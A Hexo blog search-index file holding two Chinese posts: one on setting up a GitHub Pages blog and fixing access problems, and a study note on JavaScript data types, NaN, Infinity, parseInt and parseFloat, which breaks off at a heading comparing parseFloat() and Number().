<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>My first blog</title>
    <url>/2021/05/01/My-first-blog/</url>
    <content><![CDATA[<h2 id="哈哈"><a href="#哈哈" class="headerlink" title="哈哈"></a>哈哈</h2><p>蛤蛤蛤蛤 终于搞定了 赶紧先来占个位 纪念一下五一还在学习的自己.</p>
<p>这是第二次搭建博客，但并不是我的第二个博客，因为第一次半途而废，因为当时感觉看的文章比较乱，<br>当然更重要的是 自 己 太 菜 ！    为了表达对参考文献作者的感激之情，就做个推广吧<a href="https://mp.weixin.qq.com/s/rIOoX2MMl0qEsJ4pnwJoqQ">原文</a>。</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>个人感觉上面的文章已经写的很细了 就记录一下自己在搭建过程中遇到的两个问题吧顺便练习写博客哈哈~~~</p>
<span id="more"></span>

<h5 id="1-仓库创建"><a href="#1-仓库创建" class="headerlink" title="1.仓库创建"></a>1.仓库创建</h5><p><img src="https://i.loli.net/2021/05/01/DMTzOxP1csfaSNZ.png" alt="err"></p>
<p>Repository name: 固定格式self_uesername.github.io</p>
<p>还有就是要选Public！否则github page页面是看不见相关设置的</p>
<h5 id="2-部署网站"><a href="#2-部署网站" class="headerlink" title="2.部署网站"></a>2.部署网站</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>此时进度条已到底，激动的心，颤抖的手，直接输入地址却——</p>
<p><img src="https://i.loli.net/2021/05/01/Dnv9RmXGHjxpzqh.png" alt="err"></p>
<p>啪！快乐没了（表情包请自行脑补）</p>
<p>二话不说直接百度，有人说在电脑上不可以在手机上却可以，于是我也try了一下</p>
<p>果然可以进！！！但是与我想象的好像不大一样，网站内容仅显示了两行文本，</p>
<p>看了一眼应该是main里READEME.md的内容</p>
<p>思考(发呆)一会儿之后…找到了GitHub Pages设置发现</p>
<p><img src="https://i.loli.net/2021/05/01/MGwgK5XRPYC4foL.png" alt="err"></p>
<p><code>Your GitHub Pages site is currently being built from the 【main】 branch</code></p>
<p>于是将Branch改为master 刷新手机页面，啪！快乐回来了</p>
<p>但是电脑还是不能访问，可能是要修改host，一会儿继续改..</p>
<p>已经搞定，首先查询网站的ip地址可以在<a href="https://www.ipip.net/">这里查询</a> ，</p>
<p>然后在C:\Windows\System32\drivers\etc下找到并修改hosts，写入以下内容</p>
<p><code>ip self_username.github.io</code></p>
<p>再打开powershell 输入以下内容清理DNS缓存，网站应该就可以正常访问啦。</p>
<p><code>clear -dnsclientcache</code></p>
]]></content>
      <categories>
        <category>技术</category>
        <category>Githubpage+hexo博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>First Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0001</title>
    <url>/2021/05/04/%E6%89%93%E5%8D%A10001/</url>
    <content><![CDATA[<p><font color=red><strong>青春不息，奋斗不止</strong></font></p>
<h2 id="JS数据类型"><a href="#JS数据类型" class="headerlink" title="JS数据类型"></a>JS数据类型</h2><h3 id="1-null-amp-amp-undefined-amp-amp-boolean"><a href="#1-null-amp-amp-undefined-amp-amp-boolean" class="headerlink" title="1.null &amp;&amp; undefined &amp;&amp; boolean"></a>1.null &amp;&amp; undefined &amp;&amp; boolean</h3><p><code>null</code>与<code>undefined</code>都可以表示“没有”，在if语句中都会自动转为<code>false</code><br>区别是<code>null</code>表示一个“空”的对象，转为数值是为<code>0</code><br>      <code>undefined</code>表示“此处无定义”的原始值，转为数值时为<code>NaN</code><br>      <span id="more"></span></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="literal">undefined</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;undefined is false&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// undefined is false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;null is false&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// null is false</span></span><br><span class="line"></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">null</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">null</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">undefined</span>) <span class="comment">// NaN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>undefined</code>表示“未定义”，以下场景都会返回<code>undefined</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/ 变量声明了，但没有赋值</span><br><span class="line"><span class="keyword">var</span> i;</span><br><span class="line">i <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数时，应该提供的参数没有提供，该参数等于 undefined</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">f() <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象没有赋值的属性</span></span><br><span class="line"><span class="keyword">var</span>  o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">o.p <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数没有返回值时，默认返回 undefined</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">f() <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>布尔值代表<code>true</code>和<code>false</code>两个状态，下列运算符都会返回布尔值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前置逻辑运算符： ! (Not)</span><br><span class="line">相等运算符：&#x3D;&#x3D;&#x3D;，!&#x3D;&#x3D;，&#x3D;&#x3D;，!&#x3D;</span><br><span class="line">比较运算符：&gt;，&gt;&#x3D;，&lt;，&lt;&#x3D;</span><br></pre></td></tr></table></figure>
<p>如果JS预期某个位置应该是布尔值，会将该位置上现有的值自动转为布尔值，只有以下六个<br>值被转为<code>false</code>，其它都被转为<code>true</code>，空数组和空对象对应的布尔值也为<code>true</code></p>
<p><code>undefined</code> <code>null</code> <code>false</code> <code>0</code> <code>NaN</code> <code>&quot;&quot;或&#39;&#39;(空字符串)</code></p>
<h3 id="2-数值"><a href="#2-数值" class="headerlink" title="2.数值"></a>2.数值</h3><h4 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h4><h5 id="2-1-1整数和浮点数"><a href="#2-1-1整数和浮点数" class="headerlink" title="2.1.1整数和浮点数"></a>2.1.1整数和浮点数</h5><p>JS内部，所有数字都是以64位浮点数形式储存，所以1与1.0是相同的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> === <span class="number">1.0</span>  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>也就是说JS的底层根本没有证书，所有数字都是小数（64位浮点数），但是某些运算只有整数才能完成，<br>此时JS会把64位浮点数转成32位整数，然后在进行运算<br>由于浮点数是不确定的值，所以</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span></span><br><span class="line"><span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="number">0.3</span> / <span class="number">0.1</span></span><br><span class="line"><span class="comment">// 2.9999999999999996</span></span><br><span class="line"></span><br><span class="line">(<span class="number">0.3</span> - <span class="number">0.2</span>) === (<span class="number">0.2</span> - <span class="number">0.1</span>)</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<h5 id="2-1-2数值精度"><a href="#2-1-2数值精度" class="headerlink" title="2.1.2数值精度"></a>2.1.2数值精度</h5><p>JS浮点数的64个二进制位，从最左边开始是这样构成的：<br><code>第1位：符号位，0表示正数，1表示负数，决定数的正负</code><br><code>第2-12位：指数部分，决定数值大小</code><br><code>第13-64位：小数部分，即有效数字，决定数值精度</code></p>
<p>精度最多只能到53个二进制位，这意味着，绝对值小于2的53次方的整数，即-2的53次方到2的53次方，都可以精确表示超出之后运算结果会出现错误</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>)</span><br><span class="line"><span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">1</span></span><br><span class="line"><span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">2</span></span><br><span class="line"><span class="comment">// 9007199254740994</span></span><br></pre></td></tr></table></figure>

<h5 id="2-1-3数值范围"><a href="#2-1-3数值范围" class="headerlink" title="2.1.3数值范围"></a>2.1.3数值范围</h5><p>指数部分的长度是11个二进制位，所以指数部分最大值是2047（2的11次方-1），分出一半表示负数，则JS能够表示的数值范围位<code>2的1024次方</code>到<code>2的负1023次方（开区间）</code>，超出这个范围的数则无法表示<br>如果一个数大于<code>2的1024次方</code>则会发生‘正向溢出’返回<code>Infinity</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">1024</span>) <span class="comment">// Infinity</span></span><br></pre></td></tr></table></figure>
<p>如果一个数小于<code>2的负1075次方（-1023再加上小数部分的52位）</code>，则会发生‘负向溢出’返回0</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, -<span class="number">1075</span>) <span class="comment">// 0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JavaScript 提供Number对象的<code>MAX_VALUE</code>和<code>MIN_VALUE</code>属性，返回可以表示的具体的最大值和最小值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.MAX_VALUE <span class="comment">// 1.7976931348623157e+308</span></span><br><span class="line"><span class="built_in">Number</span>.MIN_VALUE <span class="comment">// 5e-324</span></span><br></pre></td></tr></table></figure>

<h4 id="2-2-数值的表示法"><a href="#2-2-数值的表示法" class="headerlink" title="2.2.数值的表示法"></a>2.2.数值的表示法</h4><p>JS的数值有多种表示方法，可以用字面形式直接表示，比如<code>35</code>（十进制）和<code>0xFF</code>（十六进制）<br>数值也可以采用科学计数法表示,例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">123e3</span> <span class="comment">// 123000</span></span><br><span class="line"><span class="number">123e-3</span> <span class="comment">// 0.123</span></span><br><span class="line">-<span class="number">3.1E+12</span> <span class="comment">// -3100000000000</span></span><br><span class="line"><span class="number">.1e-23</span> <span class="comment">// 1e-24</span></span><br></pre></td></tr></table></figure>
<p>若数值’小数点前的数字多于21位‘或‘小数点后的零多于5个’JavaScript 会自动将数值转为科学计数法表示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1234567890123456789012</span></span><br><span class="line"><span class="comment">// 1.2345678901234568e+21</span></span><br><span class="line"></span><br><span class="line"><span class="number">123456789012345678901</span></span><br><span class="line"><span class="comment">// 123456789012345680000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 小数点后紧跟5个以上的零，</span></span><br><span class="line"><span class="comment">// 就自动转为科学计数法</span></span><br><span class="line"><span class="number">0.0000003</span> <span class="comment">// 3e-7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 否则，就保持原来的字面形式</span></span><br><span class="line"><span class="number">0.000003</span> <span class="comment">// 0.000003</span></span><br></pre></td></tr></table></figure>

<h4 id="2-3-数值的进制"><a href="#2-3-数值的进制" class="headerlink" title="2.3.数值的进制"></a>2.3.数值的进制</h4><p>使用字面量（literal）直接表示一个数值时，JS对整数提供四种进制的表示方法：十进制、十六进制、八进制、二进制<br>默认情况下，JS内部会自动将八进制、十六进制、二进制转为十进制</p>
<h4 id="2-4-特殊数值"><a href="#2-4-特殊数值" class="headerlink" title="2.4.特殊数值"></a>2.4.特殊数值</h4><h4 id="2-4-1正零和负零"><a href="#2-4-1正零和负零" class="headerlink" title="2.4.1正零和负零"></a>2.4.1正零和负零</h4><p>第一个二进制位是符号位，这意味着所有数字都有负值，包括0<br>几乎所有场合，正零和负零都被当做为<code>0</code>，唯一有区别的场合是0作为分母时：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">-<span class="number">0</span> === +<span class="number">0</span> <span class="comment">// true</span></span><br><span class="line"><span class="number">0</span> === -<span class="number">0</span> <span class="comment">// true</span></span><br><span class="line"><span class="number">0</span> === +<span class="number">0</span> <span class="comment">// true</span></span><br><span class="line">+<span class="number">0</span> <span class="comment">// 0</span></span><br><span class="line">-<span class="number">0</span> <span class="comment">// 0</span></span><br><span class="line">(-<span class="number">0</span>).toString() <span class="comment">// &#x27;0&#x27;</span></span><br><span class="line">(+<span class="number">0</span>).toString() <span class="comment">// &#x27;0&#x27;</span></span><br><span class="line">  --------------------</span><br><span class="line">  --------------------</span><br><span class="line">(<span class="number">1</span> / +<span class="number">0</span>) === (<span class="number">1</span> / -<span class="number">0</span>) <span class="comment">// false</span></span><br><span class="line"> <span class="comment">// 除以正零得到+Infinity，除以负零得到-Infinity</span></span><br></pre></td></tr></table></figure>

<h5 id="2-4-2-NaN"><a href="#2-4-2-NaN" class="headerlink" title="2.4.2 NaN"></a>2.4.2 NaN</h5><p><code>NaN</code>是一个特殊数值，属于<code>number</code>类型，表示“非数字”（not a number），主要出现在字符串解<br>析成数字出错的场合，例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">NaN</span> <span class="comment">// &#x27;number&#x27;</span></span><br><span class="line"><span class="number">5</span> - <span class="string">&#x27;x&#x27;</span> <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>另外，一些数学函数的运算结果也会出现<code>NaN</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.acos(<span class="number">2</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.log(-<span class="number">1</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Math</span>.sqrt(-<span class="number">1</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="number">0</span>除以<span class="number">0</span>也会得到<span class="literal">NaN</span></span><br><span class="line"><span class="number">0</span> / <span class="number">0</span>   <span class="comment">// NaN </span></span><br></pre></td></tr></table></figure>
<p>运算规则：<br>NaN不等于任何值，包括本身,并且与任何数（包括它自己）的运算，得到的都是NaN</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span>  <span class="comment">// false   </span></span><br><span class="line"><span class="literal">NaN</span> + <span class="number">32</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">NaN</span> - <span class="number">32</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">NaN</span> * <span class="number">32</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">NaN</span> / <span class="number">32</span> <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>数组的<code>indexOf</code>方法内部使用的是严格相等运算符，所以该方法对NaN不成立</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>) <span class="comment">// -1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>NaN在布尔运算时被当作false。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>(<span class="literal">NaN</span>) <span class="comment">// false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="2-4-3-Infinity"><a href="#2-4-3-Infinity" class="headerlink" title="2.4.3 Infinity"></a>2.4.3 Infinity</h5><p><code>infinity</code> 表示”无穷“，有正负之分，出现在无穷和非0除以0的场景中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">nfinity === -<span class="literal">Infinity</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">1024</span>)   <span class="comment">// Infinity</span></span><br><span class="line"><span class="number">0</span> / <span class="number">0</span>   <span class="comment">// NaN</span></span><br><span class="line"><span class="number">1</span> / <span class="number">0</span>   <span class="comment">// Infinity</span></span><br><span class="line"><span class="number">1</span> / -<span class="number">0</span> <span class="comment">// -Infinity</span></span><br><span class="line">-<span class="number">1</span> / -<span class="number">0</span> <span class="comment">// Infinity</span></span><br></pre></td></tr></table></figure>
<p><code>infinity</code>大于一切数值，<code>-infinity</code>小于一切数值，但与<code>NaN</code>比较会返回<code>false</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">Infinity</span> &gt; <span class="number">1000</span> <span class="comment">// true</span></span><br><span class="line">-<span class="literal">Infinity</span> &lt; -<span class="number">1000</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">Infinity</span> &gt; <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line">-<span class="literal">Infinity</span> &gt; <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">Infinity</span> &lt; <span class="literal">NaN</span> <span class="comment">// false</span></span><br><span class="line">-<span class="literal">Infinity</span> &lt; <span class="literal">NaN</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>运算规则：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span> * <span class="literal">Infinity</span> <span class="comment">// Infinity</span></span><br><span class="line"><span class="number">5</span> - <span class="literal">Infinity</span> <span class="comment">// -Infinity</span></span><br><span class="line"><span class="literal">Infinity</span> / <span class="number">5</span> <span class="comment">// Infinity</span></span><br><span class="line"><span class="number">5</span> / <span class="literal">Infinity</span> <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> * <span class="literal">Infinity</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="number">0</span> / <span class="literal">Infinity</span> <span class="comment">// 0</span></span><br><span class="line"><span class="literal">Infinity</span> / <span class="number">0</span> <span class="comment">// Infinity</span></span><br><span class="line"></span><br><span class="line"><span class="literal">Infinity</span> + <span class="literal">Infinity</span> <span class="comment">// Infinity</span></span><br><span class="line"><span class="literal">Infinity</span> * <span class="literal">Infinity</span> <span class="comment">// Infinity</span></span><br><span class="line"></span><br><span class="line"><span class="literal">Infinity</span> - <span class="literal">Infinity</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">Infinity</span> / <span class="literal">Infinity</span> <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="literal">null</span> * <span class="literal">Infinity</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">null</span> / <span class="literal">Infinity</span> <span class="comment">// 0</span></span><br><span class="line"><span class="literal">Infinity</span> / <span class="literal">null</span> <span class="comment">// Infinity</span></span><br><span class="line"></span><br><span class="line"><span class="literal">undefined</span> + <span class="literal">Infinity</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">undefined</span> - <span class="literal">Infinity</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">undefined</span> * <span class="literal">Infinity</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">undefined</span> / <span class="literal">Infinity</span> <span class="comment">// NaN</span></span><br><span class="line"><span class="literal">Infinity</span> / <span class="literal">undefined</span> <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>

<h4 id="2-5-与数值有关的全局方法"><a href="#2-5-与数值有关的全局方法" class="headerlink" title="2.5.与数值有关的全局方法"></a>2.5.与数值有关的全局方法</h4><h6 id="2-5-1-1-parseInt"><a href="#2-5-1-1-parseInt" class="headerlink" title="2.5.1.1 parseInt()"></a>2.5.1.1 parseInt()</h6><p><code>parseInt()</code>用于将字符串转为整数,若参数不是字符串，则先转换为字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;123&#x27;</span>) <span class="comment">// 123</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;   81&#x27;</span>) <span class="comment">// 81</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">1.23</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;1.23&#x27;</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>字符串转换的时候是一个个字符依次转换，如果遇到不能转为数字的字符就停止并返回已经转好的部分</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;8a&#x27;</span>) <span class="comment">// 8</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;12**&#x27;</span>) <span class="comment">// 12</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;12.34&#x27;</span>) <span class="comment">// 12</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;15e2&#x27;</span>) <span class="comment">// 15</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;15px&#x27;</span>) <span class="comment">// 15</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;abc&#x27;</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;.3&#x27;</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;+&#x27;</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;+1&#x27;</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>所以parseint的返回值只有两个，要么是一个十进制数，要么是NaN<br>如果字符串以0或0x（X）开头，会按照10进制和16进制进行解析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;011&#x27;</span>) <span class="comment">// 11</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;0x10&#x27;</span>) <span class="comment">// 16</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>若存在自动转为科学计数法的数字，则视为科学计数法表示的字符串：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="number">1000000000000000000000.5</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;1e+21&#x27;</span>) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.0000008</span>) <span class="comment">// 8</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;8e-7&#x27;</span>) <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>
<h6 id="2-5-1-2进制转换"><a href="#2-5-1-2进制转换" class="headerlink" title="2.5.1.2进制转换"></a>2.5.1.2进制转换</h6><p>parseInt()还支持第二个参数（2-36），表示被解析的进制，默认为10</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;1000&#x27;</span>) <span class="comment">// 1000</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;1000&#x27;</span>, <span class="number">10</span>) <span class="comment">// 1000</span></span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;1000&#x27;</span>, <span class="number">2</span>) <span class="comment">// 8</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;1000&#x27;</span>, <span class="number">6</span>) <span class="comment">// 216</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;1000&#x27;</span>, <span class="number">8</span>) <span class="comment">// 512</span></span><br></pre></td></tr></table></figure>
<p>若第二个参数不属于2-36则返回<code>NaN</code>,若是0、NaN、undefined则忽略</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;10&#x27;</span>, <span class="number">1</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;10&#x27;</span>, <span class="number">0</span>) <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;10&#x27;</span>, <span class="literal">null</span>) <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;10&#x27;</span>, <span class="literal">undefined</span>) <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>若字符串包含对于制定进制无意义的字符，则从最高位开始，只返回可以转换的值，如果最高位无法转换则返回<code>NaN</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;1546&#x27;</span>, <span class="number">2</span>) <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;546&#x27;</span>, <span class="number">2</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>当第一个参数不是字符串时,下面代码中，十六进制的0x11会被先转为十进制的17，再转为字符串。然后，再用36进制<br>或二进制解读字符串17，最后返回结果43和1</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="number">0x11</span>, <span class="number">36</span>) <span class="comment">// 43</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">0x11</span>, <span class="number">2</span>) <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="built_in">String</span>(<span class="number">0x11</span>), <span class="number">36</span>)</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="built_in">String</span>(<span class="number">0x11</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;17&#x27;</span>, <span class="number">36</span>)</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;17&#x27;</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>当第一个参数是八进制0开头的非字符串时，下面代码中，第一行的011会被先转为字符串9，因为9不是二进制的有效字符，<br>所以返回NaN。如果直接计算parseInt(‘011’, 2)，011则是会被当作二进制处理，返回3。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="number">011</span>, <span class="number">2</span>) <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="built_in">String</span>(<span class="number">011</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="built_in">String</span>(<span class="number">9</span>), <span class="number">2</span>)</span><br></pre></td></tr></table></figure>


<h5 id="2-5-2-parseFloat"><a href="#2-5-2-parseFloat" class="headerlink" title="2.5.2 parseFloat()"></a>2.5.2 parseFloat()</h5><p>parseFloat()用于将字符串转为浮点数，如果字符串符合科学计数法，则会进行相应的转换</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;3.14&#x27;</span>) <span class="comment">// 3.14</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;314e-2&#x27;</span>) <span class="comment">// 3.14</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;0.0314E+2&#x27;</span>) <span class="comment">// 3.14</span></span><br></pre></td></tr></table></figure>

<p>会自动过滤字符串前导的空格,如果字符串包含不能转为浮点数的字符，则不再进行往后转换，返回已经转好的部分</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;\t\v\r12.34\n &#x27;</span>) <span class="comment">// 12.34</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;3.14aaaaaa&#x27;</span>) <span class="comment">// 3.14</span></span><br></pre></td></tr></table></figure>
<p>如果参数不是字符串，或者字符串的第一个字符不能转化为浮点数，则返回<code>NaN</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>([]) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;FF2&#x27;</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;&#x27;</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>

<p>parseFloat()与number()的区别</p>
